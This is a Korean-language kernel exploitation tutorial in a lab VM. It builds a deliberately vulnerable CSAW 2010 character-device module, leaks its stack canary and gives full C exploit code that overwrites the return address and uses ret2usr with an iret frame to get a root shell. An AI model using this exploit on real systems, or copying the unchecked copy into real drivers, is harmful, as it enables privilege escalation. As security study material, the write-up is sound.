---
title: Return-to-user - x86
author: Beomsu Lee
category: [Exploitation, Kernel]
tags: [exploitation, kernel, return-to-user]
math: true
mermaid: true
---

## Description

ret2usr이란 커널영역의 코드가 사용자 모드의 코드를 실행할 수 있다는 것을 exploit code에 활용한 기술이다.

## Exploit Plan

1. 권한 상승에 필요한 함수의 주소를 찾음
2. 해당 주소를 함수 포인터에 저장
3. 해당 함수를 이용하여 유저 모드에서 권한 상승을 수행하는 함수 작성
4. 해당 주소 값을 커널 영역에 저장
    - 커널 영역은 저장된 주소로 이동 또는 실행가능한 곳이여야 함

## privilege escalation

```c
unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);

commit_creds = 0xc1082b60;
prepare_kernel_cred = 0xc1082e20;

void payload(void)
{
    commit_creds(prepare_kernel_cred(0));
}
```

## Set environment

**리눅스 버전**

```bash
bs@bs-virtual-machine:~$ uname -a
Linux bs-virtual-machine 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:27 UTC 2016 i686 i686 i686 GNU/Linux
```

**저장소 정보 저장**

- sudo vi /etc/apt/sources.list.d/ddebs.list

```
deb http://ddebs.ubuntu.com trusty main restricted universe multiverse
deb http://ddebs.ubuntu.com trusty-updates main restricted universe multiverse
deb http://ddebs.ubuntu.com trusty-proposed main restricted universe multiverse
```

**Install debug symbol**

```bash
bs@bs-virtual-machine:~$ sudo apt-get update
bs@bs-virtual-machine:~$ sudo apt-get install linux-image-4.2.0-27-generic-dbgsym
```

**Debug symbol file**

```bash
bs@bs-virtual-machine:~$ file /usr/lib/debug/boot/vmlinux-4.2.0-27-generic
/usr/lib/debug/boot/vmlinux-4.2.0-27-generic: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, BuildID[sha1=73c1ee55f76230e9050e32272d4f0f1cc1d95ff6, not stripped
```

## Disable SMEP, SMAP, KASLR

SMEP, SMAP, KASLR 활설화 여부를 확인한다.

```
bs@bs-virtual-machine:~$ cat /proc/cpuinfo | grep flags
flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss nx pdpe1gb rdtscp lm constant_tscarch_perfmon xtopology tsc_reliable nonstop_tsc eagerfpu pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avxf16c rdrand hypervisor lahf_lm abm 3dnowprefetch arat fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt xsaveopt xsavec
```

`/etc/default/grub` 파일의 `GRUB_CMDLINE_LINUX_DEFAULT` 영역에 `nosmep`, `nosmap`, `nokaslr` 추가한다.

```
GRUB_DEFAULT=0
GRUB_HIDDEN_TIMEOUT=0
GRUB_HIDDEN_TIMEOUT_QUIET=true
GRUB_TIMEOUT=10
GRUB_DISTRIBUTOR=`lsb_release -i -s 2> /dev/null || echo Debian`
GRUB_CMDLINE_LINUX_DEFAULT="quiet splash nokaslr nosmep nosmap"
GRUB_CMDLINE_LINUX=""
```

`sudo update-grub` 명령어 실행 후 재부팅한다.

```
bs@bs-virtual-machine:~$ sudo update-grub
Generating grub configuration file ...
Warning: Setting GRUB_TIMEOUT to a non-zero value when GRUB_HIDDEN_TIMEOUT is set is no longer supported.
Found linux image: /boot/vmlinuz-4.2.0-27-generic
Found initrd image: /boot/initrd.img-4.2.0-27-generic
Found linux image: /boot/vmlinuz-3.13.0-170-generic
Found initrd image: /boot/initrd.img-3.13.0-170-generic
Found linux image: /boot/vmlinuz-3.13.0-32-generic
Found initrd image: /boot/initrd.img-3.13.0-32-generic
Found memtest86+ image: /boot/memtest86+.elf
Found memtest86+ image: /boot/memtest86+.bin
done
bs@bs-virtual-machine:~$ sudo reboot
```

## Disable KADR

**KADR 비활성화**

```
bs@bs-virtual-machine:~$ sudo sysctl -w kernel.kptr_restrict=0
kernel.kptr_restrict = 0
```

## Proof of concept

**CASW 2010 Kernel Exploit**

- [https://jon.oberheide.org/files/csaw.c](https://jon.oberheide.org/files/csaw.c)
- [https://github.com/0x3f97/pwn/tree/master/kernel/csaw-ctf-2010-kernel-exploitation-challenge](https://github.com/0x3f97/pwn/tree/master/kernel/csaw-ctf-2010-kernel-exploitation-challenge)

**chardev.c**

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/sched.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <asm/current.h>
#include <linux/uaccess.h>

MODULE_LICENSE("Dual BSD/GPL");

#define DRIVER_NAME "chardev"
#define BUFFER_SIZE 64
    
static const unsigned int MINOR_BASE = 0;
static const unsigned int MINOR_NUM  = 2;
static unsigned int chardev_major;
static struct cdev chardev_cdev;
static struct class *chardev_class = NULL;

static int     chardev_release(struct inode *, struct file *);
static ssize_t chardev_read(struct file *, char *, size_t, loff_t *);
static ssize_t chardev_write(struct file *, const char *, size_t, loff_t *);
static loff_t chardev_lseek(struct file *, loff_t, int);

struct file_operations chardev_fops = {
    .release = chardev_release,
    .read    = chardev_read,
    .write   = chardev_write,
    .llseek = chardev_lseek,
};

struct data {
    unsigned char buffer[BUFFER_SIZE];
};

static int chardev_init(void)
{
    int alloc_ret = 0;
    int cdev_err = 0;
    dev_t dev;

    printk("The chardev_init() function has been called.");
    
    alloc_ret = alloc_chrdev_region(&dev, MINOR_BASE, MINOR_NUM, DRIVER_NAME);
    if (alloc_ret != 0) {
        printk(KERN_ERR  "alloc_chrdev_region = %d\n", alloc_ret);
        return -1;
    }
    //Get the major number value in dev.
    chardev_major = MAJOR(dev);
    dev = MKDEV(chardev_major, MINOR_BASE);

    //initialize a cdev structure
    cdev_init(&chardev_cdev, &chardev_fops);
    chardev_cdev.owner = THIS_MODULE;

    //add a char device to the system
    cdev_err = cdev_add(&chardev_cdev, dev, MINOR_NUM);
    if (cdev_err != 0) {
        printk(KERN_ERR  "cdev_add = %d\n", alloc_ret);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }

    chardev_class = class_create(THIS_MODULE, "chardev");
    if (IS_ERR(chardev_class)) {
        printk(KERN_ERR  "class_create\n");
        cdev_del(&chardev_cdev);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }

    device_create(chardev_class, NULL, MKDEV(chardev_major, MINOR_BASE), NULL, "chardev%d", MINOR_BASE);

    return 0;
}

static void chardev_exit(void)
{
    int minor;
    dev_t dev = MKDEV(chardev_major, MINOR_BASE);
    
    printk("The chardev_exit() function has been called.");
    
    for (minor = MINOR_BASE; minor < MINOR_BASE + MINOR_NUM; minor++) {
        device_destroy(chardev_class, MKDEV(chardev_major, minor));
    }

    class_destroy(chardev_class);
    cdev_del(&chardev_cdev);
    unregister_chrdev_region(dev, MINOR_NUM);
}

static int chardev_release(struct inode *inode, struct file *file)
{
    printk("The chardev_release() function has been called.");
    if (file->private_data) {
        kfree(file->private_data);
        file->private_data = NULL;
    }
    return 0;
}

static ssize_t chardev_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
{
    char data[BUFFER_SIZE];
    printk("The chardev_write() function has been called.");  
    printk("Before calling the copy_from_user() function : %p",data);
    if (_copy_from_user(&data, buf, count) != 0) {    // BOF!!!
        return -EFAULT;
    }
/*
    if (copy_from_user(&data, buf, count) != 0) {
        return -EFAULT;
    }
    if (__copy_from_user(&data, buf, count) != 0) {
        return -EFAULT;
    }
*/
    printk("After calling the copy_from_user() function : %p",data);
    return count;
}

static ssize_t chardev_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos)
{
    char data[BUFFER_SIZE];

    printk("The chardev_read() function has been called.\n");
    memset(data, 0, sizeof(data));
    strcpy(data, "Welcome to the CSAW CTF challenge. Best of luck!\n");
    printk("MSG : %s",data);
    printk("f_pos : %lld\n",*f_pos);
    if (memcpy(buf, data + *f_pos, BUFFER_SIZE) != 0) {    // Leak Canary!!!
        return -EFAULT;
    }

    return count;
}

static loff_t chardev_lseek(struct file *file, loff_t offset, int orig) {
    loff_t new_pos = 0;
    printk("The chardev_lseek() function has been called.");
    switch(orig) {
        case 0 : /*seek set*/
            new_pos = offset;   // Leak Canary!!!
            break;
        case 1 : /*seek cur*/
            new_pos = file->f_pos + offset;
            break;
        case 2 : /*seek end*/
            new_pos = BUFFER_SIZE - offset;
            break;
    }
    if(new_pos > BUFFER_SIZE)
        new_pos = BUFFER_SIZE;
    if(new_pos < 0)
        new_pos = 0;
    file->f_pos = new_pos;
    return new_pos;
}

module_init(chardev_init);
module_exit(chardev_exit);
```

Makefile

```makefile
obj-m = chardev.o
    
all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
    
clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

make 후 `insmod`를 통해 모듈 추가 및 666으로 권한을 변경한다.

```
bs@bs-virtual-machine:~/pwn$ ls -al /dev/chardev0 
crw-rw-rw- 1 root root 247, 0  6월 11 23:07 /dev/chardev0
```

`chardev0` 장치에서 `read()` 후 `buf`로 가져와 출력하도록 코드를 작성한다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#define TEXT_LEN 64
int main(){
    int fd;
    char buf[128];
    if((fd = open("/dev/chardev0",O_RDWR)) < 0){
            perror("open() error");
    }
    memset(buf,'A',TEXT_LEN);
    read(fd,buf,TEXT_LEN);
    printf("%s",buf);
    if(close(fd) != 0){
            perror("close() error");
    }
}
```

**Output**

```
bs@bs-virtual-machine:~/pwn$ ./exploit 
Welcome to the CSAW CTF challenge. Best of luck!
```

`chardev_read` 주소를 확인한다.

```
bs@bs-virtual-machine:~/pwn$ cat /proc/kallsyms | grep chardev
f9d3d000 t chardev_lseek    [chardev]
f9d3d0a0 t chardev_release  [chardev]
f9d3d0e0 t chardev_write    [chardev]
f9d3d160 t chardev_read [chardev]
f9d3d260 t chardev_init [chardev]
f9d3f2dc b chardev_major    [chardev]
f9d3f2a0 b chardev_cdev [chardev]
f9d3f280 b __key.24596  [chardev]
f9d3f280 b chardev_class    [chardev]
f9d3d3a0 t chardev_exit [chardev]
f9d3f080 d __this_module    [chardev]
f9d3f000 d chardev_fops [chardev]
f9d3d3a0 t cleanup_module   [chardev]
f9d3d260 t init_module  [chardev]
```

### Leak Canary

canary와 `data`의 거리차이를 계산(0x40)한다.

```
[----------------------------------registers-----------------------------------]
EAX: 0xeaecbef8 --> 0x0 
EBX: 0xbfb1032c --> 0x0 
ECX: 0x0 
EDX: 0xf9d3e14c ("Welcome to the CSAW CTF challenge. Best of luck!\n")
ESI: 0xeaecbef8 --> 0x0  <- dst
EDI: 0xeaecbf38 --> 0xe5a3dc26 --> 0x0  <- src
EBP: 0xeaecbf48 --> 0xeaecbf5c --> 0xeaecbf80 --> 0xeaecbfa4 --> 0xeaeca000 --> 0xeae9ee00 (--> ...)
ESP: 0xeaecbee4 --> 0xf9d3e11c ("The chardev_read() function has been called.\n")
EIP: 0xf9d3d1a6 --> 0x614175e8
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
0xf9d3d19d: rep stos DWORD PTR es:[edi],eax
0xf9d3d19f: mov    edx,0xf9d3e14c
0xf9d3d1a4: mov    eax,esi
=> 0xf9d3d1a6:  call   0xc1351320 <strcpy>
0xf9d3d1ab: mov    DWORD PTR [esp+0x4],esi
0xf9d3d1af: mov    DWORD PTR [esp],0xf9d3e1dd
0xf9d3d1b6: call   0xc1705c69 <printk>
0xf9d3d1bb: mov    edi,DWORD PTR [ebp-0x58]
No argument
[------------------------------------stack-------------------------------------]
0000| 0xeaecbee4 --> 0xf9d3e11c ("The chardev_read() function has been called.\n")
0004| 0xeaecbee8 --> 0xc12ee8bb --> 0xa164c689 
0008| 0xeaecbeec --> 0x4 
0012| 0xeaecbef0 --> 0xeaecbf90 --> 0x0 
0016| 0xeaecbef4 --> 0x40 ('@')
0020| 0xeaecbef8 --> 0x0 
0024| 0xeaecbefc --> 0x0 
0028| 0xeaecbf00 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0xf9d3d1a6 in ?? ()
gdb-peda$ x/24wx $ebp-0x10 <- canary
0xeaecbf38: 0xe5a3dc26  0xf9d3d160  0xeaecbf90  0xbfb1032c
0xeaecbf48: 0xeaecbf5c  0xc11ae85f  0xeaecbf90  0xead040c0
0xeaecbf58: 0x00000040  0xeaecbf80  0xc11aed79  0xeaecbf90
0xeaecbf68: 0xf9d3d027  0xf9d3e024  0x00000003  0xead040c0
0xeaecbf78: 0xead040c0  0xbfb1032c  0xeaecbfa4  0xc11af716
0xeaecbf88: 0xeaecbf90  0x00000040  0x00000000  0x00000000
gdb-peda$ p 0xeaecbf38:-0xeaecbef8
A syntax error in expression, near `:-0xeaecbef8'.
gdb-peda$ p 0xeaecbf38(canary) - 0xeaecbef8(data)
$3 = 0x40
```

canary 추출하는 코드를 작성한다.

```c
// gcc -static test.c -o test
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#define TEXT_LEN 64
int main(){
    int fd;
    char buf[128];
    char canary[4];
    
    
    if((fd = open("/dev/chardev0",O_RDWR)) < 0){
        perror("open() error");
    }
    memset(buf,'\x00',TEXT_LEN);
    lseek(fd,0x40,SEEK_CUR);
    read(fd,buf,TEXT_LEN);
    memcpy(canary,buf,4);
    printf("canary: 0x%x%x%x%x\n",canary[3] & 0xff,canary[2] & 0xff,canary[1] & 0xff,canary[0] & 0xff);
    if(close(fd) != 0){
        perror("close() error");
    }
    return 0;
    
}
```

해당 코드를 통해 카나리를 추출한다.

```
bs@bs-virtual-machine:~/pwn$ ./exploit 
canary: 0xff37b628
```

## Overflow canary

64 byte 바로 뒤 canary가 존재한다.

```
gdb-peda$ x/24wx 0xf61c1ef4
0xf61c1ef4: 0x41414141  0x41414141  0x41414141  0x41414141
0xf61c1f04: 0x41414141  0x41414141  0x41414141  0x41414141
0xf61c1f14: 0x41414141  0x41414141  0x41414141  0x41414141
0xf61c1f24: 0x41414141  0x41414141  0x41414141  0x41414141
0xf61c1f34: 0xbcb5b1d7 <-   0xf9d3d0e0  0xf61c1f90  0xbfd8444c
```

canary overwrite하는 코드를 작성한다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#define TEXT_LEN 64
int main(){
    int fd;
    char buf[128];
    char canary[4];
    
    
    if((fd = open("/dev/chardev0",O_RDWR)) < 0){
        perror("open() error");
    }
    memset(buf,'\x00',TEXT_LEN);
    lseek(fd,0x40,SEEK_CUR);
    read(fd,buf,TEXT_LEN);
    memcpy(canary,buf,4);
    printf("canary: 0x%x%x%x%x\n",canary[3] & 0xff,canary[2] & 0xff,canary[1] & 0xff,canary[0] & 0xff);
    memset(buf,'A',0x40);
    memcpy(buf+0x40,canary,0x4);
    memset(buf+0x44,'B',0x10);
    write(fd,buf,0x54);
    if(close(fd) != 0){
        perror("close() error");
    }
    return 0;
    
}
```

canary overwrite 후 overflow를 할 수 있다.

```
gdb-peda$ x/24wx 0xf399def4
0xf399def4: 0x41414141  0x41414141  0x41414141  0x41414141
0xf399df04: 0x41414141  0x41414141  0x41414141  0x41414141
0xf399df14: 0x41414141  0x41414141  0x41414141  0x41414141
0xf399df24: 0x41414141  0x41414141  0x41414141  0x41414141
0xf399df34: 0x4276c6e9  0x42424242  0x42424242  0x42424242
0xf399df44: 0x42424242  0xc11ae95f <- ret   0xf399df90  0xecc3fcc0
```

return address를 `CCCC`로 변조할 경우 다음과 같이 출력된다.

```
bs@bs-virtual-machine:~/pwn$ ./exploit 
canary: 0x253b2652
Killed
bs@bs-virtual-machine:~/pwn$ dmesg | tail
[  542.238927]  ee916e48 00000003 ee91a3c0 ee91a3c0 bf8fdbcc eeaf3fa4 c11af7a6 eeaf3f90
[  542.238931]  00000058 00000040 00000000 00000003 00000000 00000000 eeaf2000 c171111f
[  542.238934] Call Trace:
[  542.238940]  [<c11aeeb3>] ? vfs_write+0x93/0x1a0
[  542.238943]  [<c11af7a6>] ? SyS_write+0x46/0x90
[  542.238947]  [<c171111f>] ? sysenter_do_call+0x12/0x12
[  542.238948] Code:  Bad EIP value.
[  542.238950] EIP: [<43434343>] 0x43434343 SS:ESP 0068:eeaf3f4c
[  542.238952] CR2: 0000000043434343
[  542.238955] ---[ end trace 53f9907a31d3a00a ]---
```

### Exploit plan

1. `prepare_kernel_cred()` 함수의 인자 값으로 `0`을 전달해 root의 credentials 준비
2. `commit_creds()` 함수의 인자 값으로 `prepare_kernel_cred()` 함수가 리턴한 값 전달
3. `system()` 함수를 이용하여 "/bin/sh" 실행

### Find address

`prepare_kernel_cred`, `commit_creds` 주소 얻어온 후 return address 변조한다.

```c
// gcc -static test.c -o test
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#define TEXT_LEN 64
unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);

void payload(void)
{
    char *cmd = {"/bin/sh",NULL};
    commit_creds(prepare_kernel_cred(0));
    execve(cmd[0],cmd, NULL);
}
int unsigned long kallsym_getaddr(const char *str){
    FILE *fp;
    char buf[256];
    char sym[128];
    char addr[32];
    fp = fopen("/proc/kallsyms","r");
    if(fp<0) return 0;
    memset(buf,0x0,sizeof(buf));
    while(fgets(buf,256,fp) != NULL){
        memset(addr,0x0,sizeof(addr));
        memset(sym,0x0,sizeof(sym));
        sscanf(buf,"%s %*s %s",addr,sym);
        if(strcmp(sym,str) == 0){
            printf("%s\n",sym);
            return strtoul(addr,NULL,16);
        }
    }
    return 0;   
}
int main(){
    int fd;
    char buf[128];
    char canary[4];
    if((prepare_kernel_cred = kallsym_getaddr("prepare_kernel_cred"))== 0){
        printf("Can't find prepare_kernel_cred");
        return 0;
    }
    printf("%lx\n",prepare_kernel_cred);
    if((commit_creds = kallsym_getaddr("commit_creds"))== 0){
        printf("Can't find commit_creds");
        return 0;
    }
    printf("%lx\n",commit_creds);
    
    
    if((fd = open("/dev/chardev0",O_RDWR)) < 0){
        perror("open() error");
    }
    memset(buf,'\x00',TEXT_LEN);
    lseek(fd,0x40,SEEK_CUR);
    read(fd,buf,TEXT_LEN);
    memcpy(canary,buf,4);
    printf("canary: 0x%x%x%x%x\n",canary[3] & 0xff,canary[2] & 0xff,canary[1] & 0xff,canary[0] & 0xff);
    memset(buf,'A',0x40);
    memcpy(buf+0x40,canary,0x4);
    memset(buf+0x44,'B',0x10);
    *((void**)(buf+0x54)) = &payload;
    // overflow
    write(fd,buf,0x58);
    if(close(fd) != 0){
        perror("close() error");
    }
    return 0;
    
}
```

Kernel-space에서 User-space로 이동하는 경우 stack pointer에 대한 복원이 필요하다. 따라서 User-space의 함수를 호출하기 전에 stack pointer의 복원이 없어 Segmentation fault 발생한다.

```
bs@bs-virtual-machine:~/pwn$ ./test 
prepare_kernel_cred
c1082e20
commit_creds
c1082b60
canary: 0xf58bffe6
Segmentation fault (core dumped)
```

`iret(iretq with 64-bit)` 명령어를 이용해 해결이 가능하다. `iret` 명령어는 인터럽트로 중단된 프로그램 또는 프로시저로 프로그램 제어를 반환하는 명령어이다. 즉, `iret` 명령어가 실행되면, pc 값을 복원하여 이전 실행 위치로 복원된다.

`iret` 명령을 이용하기 위해 특정 stack layout이 필요하다.

|32 bit|64 bit|
|:---:|:---:|
|EIP|RIP|
|CS|CS|
|EFLAGS|EFLAGS|
|ESP|RSP|
|SS|SS|

`iret` 명령어에 필요한 stack layout 형태 구조체 생성한다. 어셈블리 코드를 이용해 stack layout에 필요한 레지스터 값을 tf 구조체에 저장하는 함수 구현한다. `EIP` 영역에는 shell을 실행하는 함수의 주소를 저장한다. ESP 레지스터에 tf 구조체의 주소를 저장하고 `iret` 명령어 호출한다.

```c
struct trap_frame {
    void * eip;
    uint32_t cs;
    uint32_t eflags;
    void * esp;
    uint32_t ss;
} __attribute__((packed));
struct trap_frame tf;
void prepare_tf(void) {
    asm("pushl %cs; popl tf+4;"
        "pushfl; popl tf+8;"
        "pushl %esp; popl tf+12;"
        "pushl %ss; popl tf+16;");
    tf.eip = &getShell ;
    tf.esp -= 1024;         // unused part of stack
}

void payload(void)
{
    commit_creds(prepare_kernel_cred(0));
    asm("mov $tf, %esp;"
        "iret ;");
}
...
```

`payload()` 함수에서 권한 상승 후 `esp` 레지스터에 `tf` 구조체의 시작 주소를 저장하고, `iret` 명령어를 호출한다.

```
=> 0x8048ea2:   push   ebp
0x8048ea3:  mov    ebp,esp
0x8048ea5:  push   ebx
0x8048ea6:  sub    esp,0x4
0x8048ea9:  mov    ebx,DWORD PTR ds:0x80ecf34
0x8048eaf:  mov    edx,DWORD PTR ds:0x80ecf38
0x8048eb5:  mov    eax,0x0
0x8048eba:  call   edx
0x8048ebc:  call   ebx
0x8048ebe:  mov    esp,0x80ecf20
0x8048ec3:  iret   
0x8048ec4:  add    esp,0x4
0x8048ec7:  pop    ebx
0x8048ec8:  pop    ebp
0x8048ec9:  ret  
```

**`tf` 구조체의 시작 주소 저장, `iret` 전 레지스터**

```
(gdb) x/24wx $esp
0x80ecf20:  0x08048e44  0x08060073  0x00000296  0xbfa5c418
0x80ecf30:  0xbfa5007b  0xc1082b60  0xc1082e20  0x00000000
0x80ecf40:  0x00000028  0x00000040  0x00000001  0x00000000
(gdb) info r
eax            0x0  0
ecx            0x0  0
edx            0x40 64
ebx            0xc1082b60   -1056429216
esp            0x80ecf20    0x80ecf20
ebp            0xe8fadf48   0xe8fadf48
esi            0x42424242   1111638594
edi            0x42424242   1111638594
eip            0x8048ec3    0x8048ec3
eflags         0x246    [ PF ZF IF ]
cs             0x60 96
ss             0x68 104
ds             0x7b 123
es             0x7b 123
fs             0xd8 216
gs             0xe0 224
```

**`iret` 후 레지스터**

```
(gdb) info r
eax            0x0  0
ecx            0x0  0
edx            0x40 64
ebx            0xc1082b60   -1056429216
esp            0xbfa5c418   0xbfa5c418
ebp            0xe8fadf48   0xe8fadf48
esi            0x42424242   1111638594
edi            0x42424242   1111638594
eip            0x8048e44    0x8048e44
eflags         0x296    [ PF AF SF IF ]
cs             0x73 115
ss             0x7b 123
ds             0x7b 123
es             0x7b 123
fs             0x0  0
gs             0x0  0
```

### Expliot code

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

#define TEXT_LEN 64
unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);

struct trap_frame {
    void * eip;
    unsigned long cs;
    unsigned long eflags;
    void * esp;
    unsigned long ss;
} __attribute__((packed));

struct trap_frame tf;

void getShell(void) {
    execl("/bin/sh", "sh", NULL);
}

void prepare_tf(void) {
    asm("pushl %cs; popl tf+4;"
        "pushfl; popl tf+8;"
        "pushl %esp; popl tf+12;"
        "pushl %ss; popl tf+16;");
    tf.eip = &getShell ;
    tf.esp -= 1024;         // unused part of stack
}
 
void payload(void)
{
    commit_creds(prepare_kernel_cred(0));
    asm("mov $tf, %esp;"
        "iret ;");
}

int unsigned long kallsym_getaddr(const char *str){
    FILE *fp;
    char buf[256];
    char sym[128];
    char addr[32];

    fp = fopen("/proc/kallsyms","r");
    if(fp<0) return 0;
    memset(buf,0x0,sizeof(buf));
    while(fgets(buf,256,fp) != NULL){
        memset(addr,0x0,sizeof(addr));
        memset(sym,0x0,sizeof(sym));
        sscanf(buf,"%s %*s %s",addr,sym);
        if(strcmp(sym,str) == 0){
            printf("%s\n",sym);
            return strtoul(addr,NULL,16);
        }
    }
    return 0;   
}

int main(){
    int fd;
    char buf[128];
    char canary[4];

    if((prepare_kernel_cred = kallsym_getaddr("prepare_kernel_cred"))== 0){
        printf("Can't find prepare_kernel_cred");
        return 0;
    }
    printf("%lx\n",prepare_kernel_cred);
    if((commit_creds = kallsym_getaddr("commit_creds"))== 0){
        printf("Can't find commit_creds");
        return 0;
    }
    printf("%lx\n",commit_creds);
    
    
    if((fd = open("/dev/chardev0",O_RDWR)) < 0){
        perror("open() error");
    }
    memset(buf,'\x00',TEXT_LEN);
    lseek(fd,0x40,SEEK_CUR);
    read(fd,buf,TEXT_LEN);
    memcpy(canary,buf,4);
    printf("canary: 0x%x%x%x%x\n",canary[3] & 0xff,canary[2] & 0xff,canary[1] & 0xff,canary[0] & 0xff);
    memset(buf,'A',0x40);
    memcpy(buf+0x40,canary,0x4);
    memset(buf+0x44,'B',0x10);
    *((void**)(buf+0x54)) = &payload;
    
    prepare_tf();

    // overflow
    write(fd,buf,0x58);

    if(close(fd) != 0){
        perror("close() error");
    }
    return 0;
    
}
```

## Exploit

```bash
bs@bs-virtual-machine:~/pwn$ ./test 
prepare_kernel_cred
c1082e20
commit_creds
c1082b60
canary: 0x2f6d1785
# id
uid=0(root) gid=0(root) groups=0(root)
```

## References
- [01.Stack smashing(32bit) & Return-to-user(ret2usr)](https://www.lazenca.net/pages/viewpage.action?pageId=23789706)